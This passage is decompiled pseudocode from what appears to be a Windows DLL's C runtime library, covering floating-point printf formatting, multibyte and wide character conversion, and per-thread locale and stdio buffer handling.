    "  _BYTE *v23; // r9",
    "  __int64 v24; // rcx",
    "  __int64 v25; // rdx",
    "  char v26; // al",
    "  _BYTE *v27; // r8",
    "",
    "  *(_BYTE *)a2 = 0;",
    "  v10 = 0;",
    "  if ( a6 >= 0 )",
    "    v10 = a6;",
    "  v11 = (_BYTE *)a2;",
    "  if ( a3 <= v10 + 11 )",
    "  {",
    "    *(_BYTE *)(a10 + 48) = 1;",
    "    *(_DWORD *)(a10 + 44) = 34;",
    "    sub_18001A598(0, 0, 0, 0, 0, a10);",
    "    return 34;",
    "  }",
    "  if ( (((unsigned __int64)*a1 >> 52) & 0x7FF) != 0x7FF )",
    "  {",
    "    if ( *a1 < 0 )",
    "    {",
    "      *(_BYTE *)a2 = 45;",
    "      v11 = (_BYTE *)(a2 + 1);",
    "    }",
    "    v15 = v11 + 1;",
    "    v16 = 1023;",
    "    if ( (*a1 & 0x7FF0000000000000LL) != 0 )",
    "    {",
    "      *v11 = 49;",
    "    }",
    "    else",
    "    {",
    "      *v11 = 48;",
    "      v16 = (*a1 & 0xFFFFFFFFFFFFFLL) != 0 ? 0x3FE : 0;",
    "    }",
    "    v17 = v11 + 2;",
    "    if ( v10 )",
    "    {",
    "      if ( !*(_BYTE *)(a10 + 40) )",
    "        sub_180019E10(a10);",
    "      v18 = ***(_BYTE ***)(*(_QWORD *)(a10 + 24) + 248LL);",
    "    }",
    "    else",
    "    {",
    "      v18 = 0;",
    "    }",
    "    *v15 = v18;",
    "    if ( (*a1 & 0xFFFFFFFFFFFFFLL) != 0 )",
    "    {",
    "      a2 = 48;",
    "      v19 = 0xF000000000000LL;",
    "      while ( v10 > 0 )",
    "      {",
    "        v20 = ((v19 & *a1 & 0xFFFFFFFFFFFFFLL) >> a2) + 48;",
    "        if ( v20 > 0x39u )",
    "          LOBYTE(v20) = 32 * (a7 ^ 1) + 7 + v20;",
    "        *v17 = v20;",
    "        --v10;",
    "        ++v17;",
    "        v19 >>= 4;",
    "        LOWORD(a2) = a2 - 4;",
    "        if ( (a2 & 0x8000u) != 0LL )",
    "          goto LABEL_36;",
    "      }",
    "      if ( !(unsigned __int8)sub_180025684(a1, v19, (unsigned __int16)a2, a9) )",
    "      {",
    "LABEL_38:",
    "        if ( !*v15 )",
    "          v17 = v11 + 1;",
    "        *v17 = 32 * (a7 ^ 1) + 80;",
    "        v23 = v17 + 2;",
    "        v24 = (((unsigned __int64)*a1 >> 52) & 0x7FF) - v16;",
    "        v25 = v24;",
    "        if ( v24 < 0 )",
    "          v24 = v16 - (((unsigned __int64)*a1 >> 52) & 0x7FF);",
    "        v26 = 43;",
    "        v27 = v17 + 2;",
    "        if ( v25 < 0 )",
    "          v26 = 45;",
    "        v17[1] = v26;",
    "        *v23 = 48;",
    "        if ( v24 < 1000 )",
    "        {",
    "          if ( v24 < 100 )",
    "          {",
    "LABEL_48:",
    "            if ( v24 < 10 )",
    "            {",
    "LABEL_50:",
    "              *v27 = v24 + 48;",
    "              v27[1] = 0;",
    "              return 0;",
    "            }",
    "LABEL_49:",
    "            *v27++ = v24 / 10 + 48;",
    "            v24 %= 10;",
    "            goto LABEL_50;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          v27 = v17 + 3;",
    "          *v23 = v24 / 1000 + 48;",
    "          v24 %= 1000;",
    "        }",
    "        *v27++ = v24 / 100 + 48;",
    "        v24 %= 100;",
    "        if ( v27 != v23 )",
    "          goto LABEL_49;",
    "        goto LABEL_48;",
    "      }",
    "      for ( i = v17 - 1; ; --i )",
    "      {",
    "        v22 = *i;",
    "        if ( ((*i - 70) & 0xDF) != 0 )",
    "          break;",
    "        *i = 48;",
    "      }",
    "      if ( i == v15 )",
    "      {",
    "        ++*(i - 1);",
    "      }",
    "      else",
    "      {",
    "        if ( v22 == 57 )",
    "          v22 = 32 * (a7 ^ 1) + 64;",
    "        *i = v22 + 1;",
    "      }",
    "    }",
    "LABEL_36:",
    "    if ( v10 > 0 )",
    "    {",
    "      LOBYTE(a2) = 48;",
    "      sub_1800368A0(v17, a2, (unsigned int)v10);",
    "      v17 += (unsigned int)v10;",
    "    }",
    "    goto LABEL_38;",
    "  }",
    "  result = sub_180025020((_DWORD)a1, a2, a3, a4, a5, v10, 0, a8, a9, a10);",
    "  if ( (_DWORD)result )",
    "  {",
    "    *v11 = 0;",
    "    return result;",
    "  }",
    "  v14 = (_BYTE *)sub_180035F3C(v11, 101);",
    "  if ( v14 )",
    "  {",
    "    *v14 = 32 * (a7 ^ 1) + 80;",
    "    v14[3] = 0;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180025020(",
    "        _QWORD *a1,",
    "        _BYTE *a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __int64 a10)",
    "{",
    "  int v12; // eax",
    "  BOOL v13; // r9d",
    "  BOOL v14; // ecx",
    "  int v15; // edx",
    "  __int64 result; // rax",
    "  int v17; // r9d",
    "  _DWORD v18[6]; // [rsp+40h] [rbp-18h] BYREF",
    "",
    "  v12 = sub_18002EB8C(*a1, a6 + 1, 1, (unsigned int)v18, a4, a5);",
    "  v13 = v18[0] == 45;",
    "  v14 = a6 > 0;",
    "  v15 = a3 - v14 - v13;",
    "  if ( a3 == -1 )",
    "    v15 = -1;",
    "  result = sub_18002EA7C((int)a2 + v13 + v14, v15, a6 + 1, (unsigned int)v18, v12, a9, a10);",
    "  if ( (_DWORD)result )",
    "  {",
    "    *a2 = 0;",
    "  }",
    "  else",
    "  {",
    "    LOBYTE(v17) = a7;",
    "    return sub_18002511C((_DWORD)a2, a3, a6, v17, a8, (__int64)v18, 0, a10);",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002511C(",
    "        _BYTE *a1,",
    "        unsigned __int64 a2,",
    "        int a3,",
    "        char a4,",
    "        int a5,",
    "        __int64 a6,",
    "        unsigned __int8 a7,",
    "        __int64 a8)",
    "{",
    "  int v8; // eax",
    "  __int64 v9; // rbp",
    "  _BYTE *v14; // rdx",
    "  __int64 v15; // r8",
    "  _BYTE *v16; // rbx",
    "  _BYTE *v17; // rbx",
    "  __int64 v18; // rdx",
    "  _BYTE *v19; // rcx",
    "  int v20; // r8d",
    "",
    "  v8 = 0;",
    "  v9 = a3;",
    "  if ( a3 > 0 )",
    "    v8 = a3;",
    "  if ( a2 > v8 + 9 )",
    "  {",
    "    if ( a7 )",
    "    {",
    "      v14 = &a1[*(_DWORD *)a6 == 45];",
    "      if ( a3 > 0 )",
    "      {",
    "        v15 = -1;",
    "        do",
    "          ++v15;",
    "        while ( v14[v15] );",
    "        sub_180036160(v14 + 1, v14, v15 + 1);",
    "      }",
    "    }",
    "    v16 = a1;",
    "    if ( *(_DWORD *)a6 == 45 )",
    "    {",
    "      *a1 = 45;",
    "      v16 = a1 + 1;",
    "    }",
    "    if ( (int)v9 > 0 )",
    "    {",
    "      *v16 = v16[1];",
    "      ++v16;",
    "      if ( !*(_BYTE *)(a8 + 40) )",
    "        sub_180019E10(a8);",
    "      *v16 = ***(_BYTE ***)(*(_QWORD *)(a8 + 24) + 248LL);",
    "    }",
    "    v17 = &v16[v9 + (a7 ^ 1LL)];",
    "    v18 = a2 + a1 - v17;",
    "    if ( a2 == -1 )",
    "      v18 = -1;",
    "    if ( (unsigned int)sub_180023124(v17, v18, (__int64)\"e+000\") )",
    "    {",
    "      sub_18001A6B4();",
    "      JUMPOUT(0x1800252FCLL);",
    "    }",
    "    v19 = v17 + 2;",
    "    if ( a4 )",
    "      *v17 = 69;",
    "    if ( **(_BYTE **)(a6 + 8) != 48 )",
    "    {",
    "      v20 = *(_DWORD *)(a6 + 4) - 1;",
    "      if ( v20 < 0 )",
    "      {",
    "        v20 = 1 - *(_DWORD *)(a6 + 4);",
    "        v17[1] = 45;",
    "      }",
    "      if ( v20 >= 100 )",
    "      {",
    "        v17[2] += v20 / 100;",
    "        v20 %= 100;",
    "      }",
    "      if ( v20 >= 10 )",
    "      {",
    "        v17[3] += v20 / 10;",
    "        LOBYTE(v20) = v20 % 10;",
    "      }",
    "      v17[4] += v20;",
    "    }",
    "    if ( a5 == 2 && *v19 == 48 )",
    "      sub_180036160(v19, v17 + 3, 3);",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a8 + 48) = 1;",
    "    *(_DWORD *)(a8 + 44) = 34;",
    "    sub_18001A598(0, 0, 0, 0, 0, a8);",
    "    return 34;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180025300(",
    "        __int64 *a1,",
    "        _BYTE *a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        __int64 a8)",
    "{",
    "  __int64 v10; // rcx",
    "  int v11; // eax",
    "  BOOL v12; // r9d",
    "  int v13; // edx",
    "  __int64 result; // rax",
    "  __int128 v15; // [rsp+40h] [rbp-18h] BYREF",
    "",
    "  v10 = *a1;",
    "  v15 = 0;",
    "  v11 = sub_18002EB8C(v10, a6, 0, (unsigned int)&v15, a4, a5);",
    "  v12 = v15 == 45;",
    "  v13 = a3 - v12;",
    "  if ( a3 == -1 )",
    "    v13 = -1;",
    "  result = sub_18002EA7C(v12 + (int)a2, v13, a6 + DWORD1(v15), (unsigned int)&v15, v11, a7, a8);",
    "  if ( !(_DWORD)result )",
    "    return sub_1800253D8((_DWORD)a2, a3, a6, (unsigned int)&v15, 0, a8);",
    "  *a2 = 0;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800253D8(_BYTE *a1, __int64 a2, int a3, __int64 a4, char a5, __int64 a6)",
    "{",
    "  __int64 v7; // rcx",
    "  int v9; // ebp",
    "  __int64 v10; // rax",
    "  __int64 v11; // rdi",
    "  bool v12; // al",
    "  _BYTE *v13; // rsi",
    "  __int64 v14; // r8",
    "  _BYTE *v15; // rbx",
    "  _BYTE *v16; // rsi",
    "  __int64 v17; // r8",
    "  int v18; // eax",
    "  int v19; // eax",
    "",
    "  v7 = *(int *)(a4 + 4);",
    "  v9 = a3;",
    "  if ( a5 && (_DWORD)v7 - 1 == a3 )",
    "    *(_WORD *)&a1[(*(_DWORD *)a4 == 45) - 1 + v7] = 48;",
    "  if ( *(_DWORD *)a4 == 45 )",
    "    *a1++ = 45;",
    "  v10 = *(int *)(a4 + 4);",
    "  v11 = -1;",
    "  if ( (int)v10 > 0 )",
    "  {",
    "    v15 = &a1[v10];",
    "  }",
    "  else",
    "  {",
    "    v12 = !(_DWORD)v10 && **(_BYTE **)(a4 + 8) == 48;",
    "    if ( a5 && v12 )",
    "    {",
    "      v13 = a1 + 1;",
    "    }",
    "    else",
    "    {",
    "      v13 = a1 + 1;",
    "      v14 = -1;",
    "      do",
    "        ++v14;",
    "      while ( a1[v14] );",
    "      sub_180036160(a1 + 1, a1, v14 + 1);",
    "    }",
    "    *a1 = 48;",
    "    v15 = v13;",
    "  }",
    "  if ( v9 > 0 )",
    "  {",
    "    v16 = v15 + 1;",
    "    v17 = -1;",
    "    do",
    "      ++v17;",
    "    while ( v15[v17] );",
    "    sub_180036160(v15 + 1, v15, v17 + 1);",
    "    if ( !*(_BYTE *)(a6 + 40) )",
    "      sub_180019E10(a6);",
    "    *v15 = ***(_BYTE ***)(*(_QWORD *)(a6 + 24) + 248LL);",
    "    v18 = *(_DWORD *)(a4 + 4);",
    "    if ( v18 < 0 )",
    "    {",
    "      v19 = -v18;",
    "      if ( a5 || v19 < v9 )",
    "        v9 = v19;",
    "      do",
    "        ++v11;",
    "      while ( v16[v11] );",
    "      sub_180036160(&v16[v9], v16, v11 + 1);",
    "      sub_1800368A0(v16, 48, v9);",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180025530(",
    "        __int64 *a1,",
    "        _BYTE *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        char a7,",
    "        int a8,",
    "        int a9,",
    "        __int64 a10)",
    "{",
    "  __int64 v11; // rcx",
    "  int v13; // eax",
    "  _BOOL8 v14; // r8",
    "  int v15; // edx",
    "  int v16; // r15d",
    "  _BYTE *v17; // rbx",
    "  __int64 result; // rax",
    "  int v19; // eax",
    "  __int128 v21; // [rsp+40h] [rbp-18h] BYREF",
    "",
    "  v11 = *a1;",
    "  v21 = 0;",
    "  v13 = sub_18002EB8C(v11, a6, 0, (unsigned int)&v21, a4, a5);",
    "  v14 = (_DWORD)v21 == 45;",
    "  v15 = a3 - v14;",
    "  v16 = DWORD1(v21) - 1;",
    "  v17 = &a2[v14];",
    "  if ( a3 == -1 )",
    "    v15 = -1;",
    "  result = sub_18002EA7C((_DWORD)v17, v15, a6, (unsigned int)&v21, v13, a9, a10);",
    "  if ( (_DWORD)result )",
    "  {",
    "    *a2 = 0;",
    "  }",
    "  else",
    "  {",
    "    v19 = DWORD1(v21) - 1;",
    "    if ( DWORD1(v21) - 1 < -4 || v19 >= a6 )",
    "    {",
    "      return sub_18002511C(a2, a3, a6, a7, a8, (__int64)&v21, 1u, a10);",
    "    }",
    "    else",
    "    {",
    "      if ( v16 < v19 )",
    "      {",
    "        while ( *v17++ )",
    "          ;",
    "        *(v17 - 2) = 0;",
    "      }",
    "      return sub_1800253D8(a2, a3, a6, (__int64)&v21, 1, a10);",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char __fastcall sub_180025684(unsigned __int64 *a1, __int64 a2, __int16 a3, int a4)",
    "{",
    "  int v4; // r14d",
    "  unsigned __int64 v6; // rbx",
    "  int v9; // eax",
    "  unsigned __int64 v10; // r8",
    "  unsigned __int64 v11; // rax",
    "  char v12; // dl",
    "",
    "  v4 = a3;",
    "  v6 = (a2 & *a1 & 0xFFFFFFFFFFFFFLL) >> a3;",
    "  if ( !a4 )",
    "    return (unsigned __int16)v6 >= 8u;",
    "  v9 = sub_180028050();",
    "  switch ( v9 )",
    "  {",
    "    case 0:",
    "      v10 = *a1;",
    "      v11 = (a2 & *a1 & 0xFFFFFFFFFFFFFLL) >> v4;",
    "      if ( (unsigned __int16)v11 > 8u )",
    "        return 1;",
    "      if ( (unsigned __int16)v11 >= 8u )",
    "      {",
    "        v12 = 1;",
    "        if ( (v10 & ((1LL << v4) - 1) & 0xFFFFFFFFFFFFFLL) == 0 )",
    "        {",
    "          if ( v4 == 48 )",
    "            LOBYTE(v10) = (v10 & 0x7FF0000000000000LL) != 0;",
    "          else",
    "            v10 = (a2 & (v10 >> 4) & 0xFFFFFFFFFFFFLL) >> v4;",
    "          return v10 & 1;",
    "        }",
    "        return v12;",
    "      }",
    "      return 0;",
    "    case 512:",
    "      return (_WORD)v6 && (*a1 & 0x8000000000000000uLL) == 0LL;",
    "    case 256:",
    "      return (_WORD)v6 && (*a1 & 0x8000000000000000uLL) != 0LL;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002579C(",
    "        __int64 *a1,",
    "        _BYTE *a2,",
    "        unsigned __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        unsigned __int64 a8,",
    "        int a9,",
    "        __int64 a10)",
    "{",
    "  unsigned __int64 v10; // r11",
    "  _BYTE *v11; // r10",
    "  unsigned __int8 v13; // si",
    "  __int64 v14; // rdx",
    "  unsigned int v15; // r8d",
    "  unsigned __int64 v16; // rcx",
    "  unsigned __int64 v17; // rdx",
    "  unsigned __int64 v18; // r8",
    "  int v19; // edx",
    "  unsigned int v20; // ebx",
    "",
    "  v10 = a3;",
    "  v11 = a2;",
    "  if ( !a2 || !a3 || !a4 || !a5 )",
    "  {",
    "    *(_BYTE *)(a10 + 48) = 1;",
    "    *(_DWORD *)(a10 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a10);",
    "    return 22;",
    "  }",
    "  v13 = a6 == 65 || (unsigned int)(a6 - 69) <= 2;",
    "  if ( (a8 & 8) != 0 || (v14 = *a1, (((unsigned __int64)*a1 >> 52) & 0x7FF) != 0x7FF) )",
    "  {",
    "    v19 = (a8 >> 4) & 1 | 2;",
    "    v20 = (a8 & 0x20) != 0 ? a9 : 0;",
    "    if ( a6 != 65 )",
    "    {",
    "      switch ( a6 )",
    "      {",
    "        case 'E':",
    "          return sub_180025020(a1, v11, a3, a4, a5, a7, v13, v19, v20, a10);",
    "        case 'F':",
    "          return sub_180025300(a1, v11, a3, a4, a5, a7, v20, a10);",
    "        case 'G':",
    "          return sub_180025530(a1, v11, a3, a4, a5, a7, v13, v19, v20, a10);",
    "      }",
    "      if ( a6 != 97 )",
    "      {",
    "        if ( a6 != 101 )",
    "        {",
    "          if ( a6 != 102 )",
    "            return sub_180025530(a1, v11, a3, a4, a5, a7, v13, v19, v20, a10);",
    "          return sub_180025300(a1, v11, a3, a4, a5, a7, v20, a10);",
    "        }",
    "        return sub_180025020(a1, v11, a3, a4, a5, a7, v13, v19, v20, a10);",
    "      }",
    "    }",
    "    return sub_180024C88(a1, (__int64)v11, a3, a4, a5, a7, v13, v19, v20, a10);",
    "  }",
    "  v15 = 12;",
    "  if ( (v14 & 0xFFFFFFFFFFFFFLL) != 0 )",
    "  {",
    "    if ( v14 < 0 && (v14 & 0xFFFFFFFFFFFFFLL) == 0x8000000000000LL )",
    "      v16 = 12;",
    "    else",
    "      v16 = (-(__int64)((v14 & 0x8000000000000LL) != 0) & 0xFFFFFFFFFFFFFFFCuLL) + 8;",
    "  }",
    "  else",
    "  {",
    "    v16 = 0;",
    "  }",
    "  v17 = (unsigned __int64)v14 >> 63;",
    "  if ( v10 >= v17 + 4 )",
    "  {",
    "    v18 = -1;",
    "    if ( (_BYTE)v17 )",
    "    {",
    "      *v11++ = 45;",
    "      *v11 = 0;",
    "      if ( v10 != -1 )",
    "        --v10;",
    "    }",
    "    do",
    "      ++v18;",
    "    while ( *((_BYTE *)*(&off_18003DF40 + 2 * (v13 ^ 1u) + v16) + v18) );",
    "    if ( (unsigned int)sub_180023124(v11, v10, (__int64)*(&off_18003DF40 + 2 * (v13 ^ 1) + v16 + (v10 <= v18))) )",
    "    {",
    "      sub_18001A6B4();",
    "      JUMPOUT(0x180025A80LL);",
    "    }",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    *v11 = 0;",
    "  }",
    "  return v15;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180025A84(int *a1, _BYTE *a2, unsigned __int64 a3, unsigned __int16 a4, __int64 a5)",
    "{",
    "  unsigned int v5; // ebx",
    "  __int64 v9; // rdi",
    "  unsigned int v10; // esi",
    "  __int64 v11; // rax",
    "  int v12; // ecx",
    "  int v13; // eax",
    "  __int64 result; // rax",
    "  int v15; // eax",
    "  __int64 v16; // [rsp+68h] [rbp+10h] BYREF",
    "  unsigned __int16 v17; // [rsp+78h] [rbp+20h] BYREF",
    "",
    "  v17 = a4;",
    "  v5 = 0;",
    "  if ( !a2 && a3 )",
    "  {",
    "    if ( a1 )",
    "      *a1 = 0;",
    "    return 0;",
    "  }",
    "  if ( a1 )",
    "    *a1 = -1;",
    "  v9 = a5;",
    "  if ( a3 > 0x7FFFFFFF )",
    "  {",
    "    v10 = 22;",
    "LABEL_39:",
    "    *(_DWORD *)(v9 + 44) = v10;",
    "    *(_BYTE *)(v9 + 48) = 1;",
    "    sub_18001A598(0, 0, 0, 0, 0, v9);",
    "    return v10;",
    "  }",
    "  if ( !*(_BYTE *)(a5 + 40) )",
    "  {",
    "    sub_180019E10(a5);",
    "    a4 = v17;",
    "  }",
    "  v11 = *(_QWORD *)(v9 + 24);",
    "  v12 = *(_DWORD *)(v11 + 12);",
    "  if ( v12 != 65001 )",
    "  {",
    "    if ( !*(_QWORD *)(v11 + 312) )",
    "    {",
    "      if ( a4 > 0xFFu )",
    "      {",
    "        if ( a2 && a3 )",
    "          sub_1800368A0(a2, 0, a3);",
    "        goto LABEL_23;",
    "      }",
    "      if ( !a2 )",
    "      {",
    "LABEL_27:",
    "        if ( a1 )",
    "          *a1 = 1;",
    "        return 0;",
    "      }",
    "      if ( a3 )",
    "      {",
    "        *a2 = a4;",
    "        goto LABEL_27;",
    "      }",
    "LABEL_38:",
    "      v10 = 34;",
    "      goto LABEL_39;",
    "    }",
    "    LODWORD(v16) = 0;",
    "    v15 = sub_18002C260(v12, 0, (unsigned int)&v17, 1, (_DWORD)a2, a3, 0, (__int64)&v16);",
    "    if ( v15 )",
    "    {",
    "      if ( !(_DWORD)v16 )",
    "      {",
    "        if ( a1 )",
    "          *a1 = v15;",
    "        return 0;",
    "      }",
    "    }",
    "    else if ( GetLastError() == 122 )",
    "    {",
    "      if ( a2 && a3 )",
    "        sub_1800368A0(a2, 0, a3);",
    "      goto LABEL_38;",
    "    }",
    "LABEL_23:",
    "    result = 42;",
    "    *(_DWORD *)(v9 + 44) = 42;",
    "    *(_BYTE *)(v9 + 48) = 1;",
    "    return result;",
    "  }",
    "  v16 = 0;",
    "  v13 = sub_18002FE1C(a2, a4, &v16, v9);",
    "  if ( a1 )",
    "    *a1 = v13;",
    "  if ( v13 <= 4 )",
    "    return 0;",
    "  if ( *(_BYTE *)(v9 + 48) )",
    "    return *(unsigned int *)(v9 + 44);",
    "  return v5;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180025C34(_WORD *a1, unsigned __int8 *a2, unsigned __int64 a3, __int64 a4)",
    "{",
    "  __int64 v8; // rdx",
    "  unsigned int v9; // r10d",
    "  __int64 result; // rax",
    "  int v11; // r9d",
    "",
    "  if ( !a2 || !a3 )",
    "  {",
    "    qword_18004DC78 = 0;",
    "    return 0;",
    "  }",
    "  if ( !*a2 )",
    "  {",
    "    if ( a1 )",
    "      *a1 = 0;",
    "    return 0;",
    "  }",
    "  if ( !*(_BYTE *)(a4 + 40) )",
    "    sub_180019E10(a4);",
    "  v8 = *(_QWORD *)(a4 + 24);",
    "  v9 = *(_DWORD *)(v8 + 12);",
    "  if ( v9 != 65001 )",
    "  {",
    "    if ( !*(_QWORD *)(v8 + 312) )",
    "    {",
    "      if ( a1 )",
    "        *a1 = *a2;",
    "      return 1;",
    "    }",
    "    if ( *(__int16 *)(*(_QWORD *)v8 + 2LL * *a2) >= 0 )",
    "    {",
    "      if ( (unsigned int)sub_18002C1D0(v9, 9, a2) )",
    "        return 1;",
    "    }",
    "    else",
    "    {",
    "      v11 = *(_DWORD *)(v8 + 8);",
    "      if ( v11 > 1 && (int)a3 >= v11 && (unsigned int)sub_18002C1D0(v9, 9, a2)",
    "        || a3 >= *(int *)(*(_QWORD *)(a4 + 24) + 8LL) && a2[1] )",
    "      {",
    "        return *(unsigned int *)(*(_QWORD *)(a4 + 24) + 8LL);",
    "      }",
    "    }",
    "    *(_BYTE *)(a4 + 48) = 1;",
    "    result = 0xFFFFFFFFLL;",
    "    *(_DWORD *)(a4 + 44) = 42;",
    "    return result;",
    "  }",
    "  result = sub_18002FEC0((_DWORD)a1, (_DWORD)a2, a3, (unsigned int)&qword_18004DC78, a4);",
    "  if ( (int)result < 0 )",
    "    return 0xFFFFFFFFLL;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180025DAC(__int64 a1)",
    "{",
    "  if ( a1 )",
    "    return *(unsigned int *)(a1 + 24);",
    "  *(_DWORD *)sub_18001A80C() = 22;",
    "  invalid_parameter_noinfo();",
    "  return 0xFFFFFFFFLL;",
    "}",
    "",
    "",
    "int __cdecl get_printf_count_output()",
    "{",
    "  return qword_18004DC80 == (_security_cookie | 1);",
    "}",
    "",
    "",
    "bool __fastcall sub_180025DEC(char *a1)",
    "{",
    "  int v2; // eax",
    "",
    "  if ( a1 == sub_1800173B8(2u) )",
    "    return 1;",
    "  if ( a1 != sub_1800173B8(1u) )",
    "    return 0;",
    "  v2 = sub_180025DAC((__int64)a1);",
    "  return isatty(v2) != 0;",
    "}",
    "",
    "",
    "char __fastcall sub_180025E38(__int64 a1)",
    "{",
    "  XSAVE_FORMAT *v2; // rdi",
    "",
    "  if ( !sub_180025DEC((char *)a1) )",
    "    return 0;",
    "  if ( (char *)a1 == sub_1800173B8(1u) )",
    "  {",
    "    v2 = &qword_18004DC88;",
    "  }",
    "  else",
    "  {",
    "    if ( (char *)a1 != sub_1800173B8(2u) )",
    "      return 0;",
    "    v2 = &qword_18004DC90;",
    "  }",
    "  ++dword_18004D2E0;",
    "  if ( (*(_DWORD *)(a1 + 20) & 0x4C0) != 0 )",
    "    return 0;",
    "  _InterlockedOr((volatile signed __int32 *)(a1 + 20), 0x282u);",
    "  if ( !*(_QWORD *)&v2->ControlWord )",
    "  {",
    "    *(_QWORD *)&v2->ControlWord = sub_180024B50(0x1000u);",
    "    sub_180023374(0);",
    "  }",
    "  if ( *(_QWORD *)&v2->ControlWord )",
    "  {",
    "    *(_QWORD *)(a1 + 8) = *(_QWORD *)&v2->ControlWord;",
    "    *(_QWORD *)a1 = *(_QWORD *)&v2->ControlWord;",
    "    *(_DWORD *)(a1 + 16) = 4096;",
    "    *(_DWORD *)(a1 + 32) = 4096;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(a1 + 16) = 2;",
    "    *(_QWORD *)(a1 + 8) = a1 + 28;",
    "    *(_QWORD *)a1 = a1 + 28;",
    "    *(_DWORD *)(a1 + 32) = 2;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180025F00(char a1, __int64 a2, __int64 a3)",
    "{",
    "  __int64 result; // rax",
    "",
    "  if ( a1 )",
    "  {",
    "    result = *(_DWORD *)(a2 + 20) >> 9;",
    "    if ( (*(_DWORD *)(a2 + 20) & 0x200) != 0 )",
    "    {",
    "      result = sub_18001F3E0(a2, a3);",
    "      _InterlockedAnd((volatile signed __int32 *)(a2 + 20), 0xFFFFFD7F);",
    "      *(_DWORD *)(a2 + 32) = 0;",
    "      *(_QWORD *)(a2 + 8) = 0;",
    "      *(_QWORD *)a2 = 0;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_180025F40(__int64 a1, int *a2, __int64 a3, int *a4)",
    "{",
    "  sub_1800209E8(*a2);",
    "  _InterlockedIncrement(*(volatile signed __int32 **)(**(_QWORD **)a3 + 136LL));",
    "  sub_180020A3C(*a4);",
    "}",
    "",
    "",
    "void __fastcall sub_180025F80(__int64 a1, int *a2, _QWORD **a3, int *a4)",
    "{",
    "  sub_1800209E8(*a2);",
    "  sub_180026250(**a3, 0);",
    "  sub_180020A3C(*a4);",
    "}",
    "",
    "",
    "void __fastcall sub_180025FC0(__int64 a1, int *a2, __int64 a3, int *a4)",
    "{",
    "  sub_1800209E8(*a2);",
    "  sub_180026250(**(_QWORD **)a3, ***(_QWORD ***)(a3 + 8));",
    "  sub_180020A3C(*a4);",
    "}",
    "",
    "",
    "void __fastcall sub_180026008(__int64 a1, int *a2, __int64 a3, int *a4)",
    "{",
    "  XSAVE_FORMAT *v6; // rcx",
    "",
    "  sub_1800209E8(*a2);",
    "  v6 = *(XSAVE_FORMAT **)(**(_QWORD **)a3 + 136LL);",
    "  if ( v6",
    "    && _InterlockedExchangeAdd((volatile signed __int32 *)v6, 0xFFFFFFFF) == 1",
    "    && v6 != (XSAVE_FORMAT *)&unk_18004B760 )",
    "  {",
    "    sub_180023374(v6);",
    "  }",
    "  sub_180020A3C(*a4);",
    "}",
    "",
    "",
    "void __fastcall sub_180026068(__int64 a1)",
    "{",
    "  int v1; // [rsp+20h] [rbp-30h] BYREF",
    "  int v2; // [rsp+24h] [rbp-2Ch] BYREF",
    "  __int64 v3; // [rsp+28h] [rbp-28h] BYREF",
    "  __int64 *v4; // [rsp+30h] [rbp-20h] BYREF",
    "  __int64 *v5; // [rsp+38h] [rbp-18h] BYREF",
    "  _QWORD v6[2]; // [rsp+40h] [rbp-10h] BYREF",
    "  char v7; // [rsp+68h] [rbp+18h] BYREF",
    "  int v8; // [rsp+70h] [rbp+20h] BYREF",
    "  int v9; // [rsp+78h] [rbp+28h] BYREF",
    "",
    "  v3 = a1;",
    "  v5 = &v3;",
    "  v8 = 5;",
    "  v9 = 5;",
    "  v6[0] = &v3;",
    "  v6[1] = &v4;",
    "  v1 = 4;",
    "  v2 = 4;",
    "  v4 = qword_18004DCA0;",
    "  *(_DWORD *)(a1 + 40) = 1;",
    "  *(_QWORD *)v3 = &unk_18003D330;",
    "  *(_DWORD *)(v3 + 936) = 1;",
    "  *(_QWORD *)(v3 + 136) = &unk_18004B760;",
    "  *(_WORD *)(v3 + 188) = 67;",
    "  *(_WORD *)(v3 + 450) = 67;",
    "  *(_QWORD *)(v3 + 928) = 0;",
    "  sub_180025F40((__int64)&v7, &v9, (__int64)&v5, &v8);",
    "  sub_180025FC0((__int64)&v7, &v2, (__int64)v6, &v1);",
    "}",
    "",
    "",
    "void __fastcall Concurrency::details::SchedulerProxy::DeleteThis(XSAVE_FORMAT *lpFlsData)",
    "{",
    "  if ( lpFlsData )",
    "  {",
    "    sub_180026158();",
    "    sub_180023374(lpFlsData);",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_180026158(XSAVE_FORMAT **a1)",
    "{",
    "  int v1; // [rsp+20h] [rbp-20h] BYREF",
    "  int v2; // [rsp+24h] [rbp-1Ch] BYREF",
    "  XSAVE_FORMAT **v3; // [rsp+28h] [rbp-18h] BYREF",
    "  XSAVE_FORMAT ***v4; // [rsp+30h] [rbp-10h] BYREF",
    "  XSAVE_FORMAT ***v5; // [rsp+38h] [rbp-8h] BYREF",
    "  char v6; // [rsp+58h] [rbp+18h] BYREF",
    "  int v7; // [rsp+60h] [rbp+20h] BYREF",
